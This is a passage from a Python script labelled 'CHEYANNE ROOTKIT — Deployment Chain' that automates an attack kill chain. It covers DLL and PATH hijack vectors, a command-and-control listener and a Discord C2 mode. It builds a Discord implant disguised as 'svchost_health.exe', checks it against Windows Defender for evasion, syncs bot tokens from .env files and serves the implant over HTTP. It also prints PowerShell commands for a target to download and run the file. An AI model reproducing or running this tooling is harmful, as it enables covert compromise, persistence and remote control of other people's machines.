        log(f"Check manually: type {VECTORS[vector_id]['canary']}")
    log(f"Evidence: {evidence_dir}")
    log(f"C2 listener: python deploy.py --listen {c2_port}")

    # ── PHASE 10: LISTENER (optional, interactive) ──
    if canary_content and "SYSTEM" in canary_content:
        log_phase("SYSTEM ACHIEVED — STARTING C2 LISTENER")
        log(f"Listening on {ip}:{c2_port}...")
        log("Ctrl+C to exit listener")
        start_listener(c2_port)

    return True

# ═══════════════════════════════════════════════════════════════
# CLEANUP
# ═══════════════════════════════════════════════════════════════

def cleanup(vector_id=None):
    """Remove deployed payloads and canary files."""
    log_phase("CLEANUP")

    targets = [vector_id] if vector_id else list(VECTORS.keys())

    for vid in targets:
        v = VECTORS.get(vid)
        if not v:
            continue

        if v.get("canary") and os.path.exists(v["canary"]):
            os.remove(v["canary"])
            log_ok(f"Removed canary: {v['canary']}")

        if v["type"] in ("phantom_dll", "path_hijack"):
            local_bin = os.path.join(os.environ["USERPROFILE"], ".local", "bin")
            planted = os.path.join(local_bin, v["binary"])
            if os.path.exists(planted):
                os.remove(planted)
                log_ok(f"Removed planted: {planted}")

    log_ok("Cleanup complete")

# ═══════════════════════════════════════════════════════════════
# DISCORD IMPLANT OPS
# ═══════════════════════════════════════════════════════════════

IMPLANT_SRC = os.path.join(ROOT, "agent", "discord_implant.py")
IMPLANT_EXE = os.path.join(ROOT, "agent", "dist", "svchost_health.exe")
HERMES_ENV = os.path.join(os.environ.get("LOCALAPPDATA", ""), "hermes", ".env")
CHEYANNE_ENV = os.path.join(ROOT, ".env")

def implant_token_sync():
    """Check all token sources match. Fix mismatches automatically."""
    tokens = {}

    # read hermes token (source of truth — it's the live bot)
    if os.path.exists(HERMES_ENV):
        with open(HERMES_ENV, encoding="utf-8", errors="replace") as f:
            for line in f:
                if line.strip().startswith("DISCORD_BOT_TOKEN="):
                    tokens["hermes"] = line.strip().split("=", 1)[1]

    # read cheyanne .env token
    if os.path.exists(CHEYANNE_ENV):
        with open(CHEYANNE_ENV, encoding="utf-8", errors="replace") as f:
            for line in f:
                if line.strip().startswith("DISCORD_BOT_TOKEN="):
                    tokens["cheyanne_env"] = line.strip().split("=", 1)[1]

    # read implant source token
    if os.path.exists(IMPLANT_SRC):
        with open(IMPLANT_SRC, encoding="utf-8", errors="replace") as f:
            for line in f:
                if "BOT_TOKEN" in line and "=" in line and not line.strip().startswith("#"):
                    val = line.split("=", 1)[1].strip().strip('"').strip("'")
                    if val and len(val) > 20:
                        tokens["implant_src"] = val
                        break

    if not tokens:
        log_fail("No tokens found anywhere")
        return False

    hermes_token = tokens.get("hermes")
    if not hermes_token:
        log_warn("Hermes .env not found — can't verify token")
        return True

    mismatches = []
    for name, tok in tokens.items():
        if name != "hermes" and tok != hermes_token:
            mismatches.append(name)

    if not mismatches:
        log_ok("Token sync: all sources match hermes (source of truth)")
        return True

    log_warn(f"TOKEN MISMATCH detected: {', '.join(mismatches)}")
    log(f"  Hermes token: ...{hermes_token[-12:]}")

    # auto-fix cheyanne .env
    if "cheyanne_env" in mismatches:
        lines = []
        with open(CHEYANNE_ENV, encoding="utf-8", errors="replace") as f:
            lines = f.readlines()
        with open(CHEYANNE_ENV, "w", encoding="utf-8") as f:
            for line in lines:
                if line.strip().startswith("DISCORD_BOT_TOKEN="):
                    f.write(f"DISCORD_BOT_TOKEN={hermes_token}\n")
                else:
                    f.write(line)
        log_ok("Fixed: cheyanne .env updated")

    # auto-fix implant source
    if "implant_src" in mismatches:
        old_token = tokens["implant_src"]
        with open(IMPLANT_SRC, encoding="utf-8", errors="replace") as f:
            src = f.read()
        src = src.replace(old_token, hermes_token)
        with open(IMPLANT_SRC, "w", encoding="utf-8") as f:
            f.write(src)
        log_ok("Fixed: implant source updated")

    return True


def implant_rebuild():
    """Rebuild discord implant .exe via PyInstaller."""
    log_phase("REBUILD DISCORD IMPLANT")

    # sync tokens first
    implant_token_sync()

    agent_dir = os.path.join(ROOT, "agent")
    log(f"Source: {IMPLANT_SRC}")
    log(f"Output: {IMPLANT_EXE}")

    # kill any running instance of old exe
    try:
        subprocess.run(
            ["taskkill", "/F", "/IM", "svchost_health.exe"],
            capture_output=True, timeout=5
        )
    except Exception:
        pass

    cmd = [
        sys.executable, "-m", "PyInstaller",
        "--onefile", "--noconsole",
        "--name", "svchost_health",
        IMPLANT_SRC
    ]
    log(f"Building: {' '.join(cmd[-4:])}")
    r = subprocess.run(cmd, cwd=agent_dir, capture_output=True, text=True, timeout=120)

    if r.returncode != 0:
        log_fail(f"PyInstaller failed:\n{r.stderr[-300:]}")
        return False

    if os.path.exists(IMPLANT_EXE):
        size = os.path.getsize(IMPLANT_EXE) / (1024 * 1024)
        log_ok(f"Built: svchost_health.exe ({size:.1f} MB)")

        # scan against defender
        if MPCMDRUN:
            log("Scanning against Defender...")
            scan = subprocess.run(
                [MPCMDRUN, "-Scan", "-ScanType", "3", "-File", IMPLANT_EXE],
                capture_output=True, text=True, timeout=30
            )
            if scan.returncode == 0:
                log_ok("Defender: CLEAN")
            else:
                log_warn("Defender: FLAGGED — may need mutation")
        return True
    else:
        log_fail("Build produced no output")
        return False


def implant_serve(port=8888):
    """HTTP serve the implant dist folder for target download."""
    log_phase("HTTP PAYLOAD SERVER")

    dist_dir = os.path.join(ROOT, "agent", "dist")
    if not os.path.exists(IMPLANT_EXE):
        log_fail("No implant .exe — run --implant-rebuild first")
        return

    ip = get_local_ip()
    size = os.path.getsize(IMPLANT_EXE) / (1024 * 1024)

    log(f"Serving: {dist_dir}")
    log(f"File:    svchost_health.exe ({size:.1f} MB)")
    log(f"URL:     http://{ip}:{port}/svchost_health.exe")
    log("")
    log("On target (PowerShell):")
    log(f'  Invoke-WebRequest -Uri "http://{ip}:{port}/svchost_health.exe" '
        f'-OutFile "$env:TEMP\\svchost_health.exe"')
    log(f'  & "$env:TEMP\\svchost_health.exe"')
    log("")
    log("On target (browser):")
    log(f"  http://{ip}:{port}/svchost_health.exe")
    log("")
    log("Ctrl+C to stop serving.")
    log("")

    import http.server
    import functools

    handler = functools.partial(http.server.SimpleHTTPRequestHandler, directory=dist_dir)
    with http.server.HTTPServer(("0.0.0.0", port), handler) as httpd:
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            log("\nServer stopped.")


def implant_deploy_full(port=8888):
    """Full pipeline: sync tokens → rebuild → serve."""
    log_phase("DISCORD IMPLANT — FULL DEPLOY PIPELINE")
    log("Step 1/3: Token sync")
    implant_token_sync()
    log("")
    log("Step 2/3: Rebuild .exe")
    if not implant_rebuild():
        return
    log("")
    log("Step 3/3: HTTP serve for target download")
    implant_serve(port)


# ═══════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════

def main():
    parser = argparse.ArgumentParser(
        description="CHEYANNE ROOTKIT — Deployment Chain",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("--recon", action="store_true", help="Run recon only")
    parser.add_argument("--compile", action="store_true", help="Compile all components")
    parser.add_argument("--compile-shell", nargs=2, metavar=("IP", "PORT"),
                        help="Build shell with baked-in C2 address")
    parser.add_argument("--deploy", type=str, help="Deploy vector (V4/V6/V7)")
    parser.add_argument("--chain", type=str, help="Full kill chain with vector")
    parser.add_argument("--status", action="store_true", help="Check detection status")
    parser.add_argument("--listen", type=int, nargs="?", const=4443, help="Start listener")
    parser.add_argument("--discord", action="store_true", help="Start Discord C2 (PALPATINE)")
    parser.add_argument("--canary", type=str, help="Check canary for vector")
    parser.add_argument("--port", type=int, default=4443, help="C2 port (default: 4443)")
    parser.add_argument("--pentest", action="store_true",
                        help="Full pentest automation")
    parser.add_argument("--profile", type=str, default="local",
                        choices=list(PROFILES.keys()),
                        help="Target profile (default: local)")
    parser.add_argument("--dry-run", action="store_true",
                        help="Show plan without executing")
    parser.add_argument("--skip-compile", action="store_true",
                        help="Skip compilation step")
    parser.add_argument("--skip-recon", action="store_true",
                        help="Skip recon, use profile defaults")
    parser.add_argument("--canary-timeout", type=int, default=300,
                        help="Canary monitoring timeout in seconds (default: 300)")
    parser.add_argument("--cleanup", type=str, nargs="?", const="ALL",
                        help="Remove deployed payloads (ALL or vector ID)")
    parser.add_argument("--implant-sync", action="store_true",
                        help="Check & fix Discord bot token across all configs")
    parser.add_argument("--implant-rebuild", action="store_true",
                        help="Sync tokens + rebuild svchost_health.exe")
    parser.add_argument("--implant-serve", type=int, nargs="?", const=8888,
                        help="HTTP serve implant for target download (default port 8888)")
    parser.add_argument("--implant-deploy", type=int, nargs="?", const=8888,
                        help="Full pipeline: sync → rebuild → serve")

    args = parser.parse_args()

    if args.pentest:
        pentest_auto(
            profile_name=args.profile,
            dry_run=args.dry_run,
            skip_compile=args.skip_compile,
            skip_recon=args.skip_recon,
            c2_port=args.port,
            canary_timeout=args.canary_timeout,
        )
    elif args.recon:
        banner()
        recon_log = run_recon()
        if recon_log:
            findings = parse_recon_log(recon_log)
            print_recon_summary(findings)
    elif args.compile:
        banner()
        compile_all()
    elif args.compile_shell:
        banner()
        compile_shell_with_c2(args.compile_shell[0], int(args.compile_shell[1]))
    elif args.deploy:
        banner()
        vid = args.deploy.upper()
        if check_vector_ready(vid):
            deploy_vector(vid, PROFILES.get(args.profile))
    elif args.chain:
        banner()
        vid = args.chain.upper()
        ip = get_local_ip()
        log_phase(f"KILL CHAIN — {vid}")
        log(f"C2: {ip}:{args.port}")

        log_phase("PHASE 0: DETECTION STATUS")
        scan_all_quick()

        log_phase("PHASE 1+2: DARK ROOM")
        run_dark_room(test_only=True)

        log_phase("PHASE 3: DEPLOY")
        if check_vector_ready(vid):
            deploy_vector(vid, PROFILES.get(args.profile))

        log_phase("PHASE 4: MONITOR")
        monitor_canary(vid, timeout=args.canary_timeout)

        log(f"\nStart listener: python deploy.py --listen {args.port}")

    elif args.status:
        banner()
        check_status()
    elif args.listen is not None:
        banner()
        start_listener(args.listen)
    elif args.discord:
        banner()
        log_phase("DISCORD C2 — PALPATINE MODE")
        subprocess.run([sys.executable, os.path.join(ROOT, "shell", "cheyanne_discord_c2.py")])
    elif args.canary:
        v = VECTORS.get(args.canary.upper())
        if v:
            content = check_canary(v["canary"])
            if content:
                log_ok(f"CANARY CONFIRMED: {v['canary']}")
                log(f"Content: {content}")
            else:
                log(f"No canary at {v['canary']}")
        else:
            log_fail(f"Unknown vector: {args.canary}")
    elif args.cleanup:
        banner()
        if args.cleanup == "ALL":
            cleanup()
        else:
            cleanup(args.cleanup.upper())
    elif args.implant_sync:
        banner()
        implant_token_sync()
    elif args.implant_rebuild:
        banner()
        implant_rebuild()
    elif args.implant_serve is not None:
        banner()
        implant_serve(args.implant_serve)
    elif args.implant_deploy is not None:
        banner()
        implant_deploy_full(args.implant_deploy)
    else:
        parser.print_help()


if __name__ == "__main__":
    main()
